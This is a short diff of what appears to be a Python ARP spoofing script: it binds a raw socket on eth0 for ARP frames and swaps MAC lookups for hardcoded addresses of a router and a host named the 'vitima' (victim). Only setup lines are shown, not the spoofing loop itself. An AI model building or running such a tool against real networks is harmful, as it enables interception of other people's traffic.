@@ -17,9 +17,9 @@ raw.bind(("eth0",socket.htons(0x0806)))
 
 src_mac = '08:00:27:ad:25:87'
 ip_router = "192.168.240.26"
-router_mac = get_mac(ip_router)
+router_mac = '86:04:8f:57:3a:44'
 ip_vitima = "192.168.240.124"
-vit_mac = get_mac(ip_vitima)
+vit_mac = "a0:b3:39:2b:4c:79"
 
 type_hardware = 1
 type_protocol = 0x0800                               
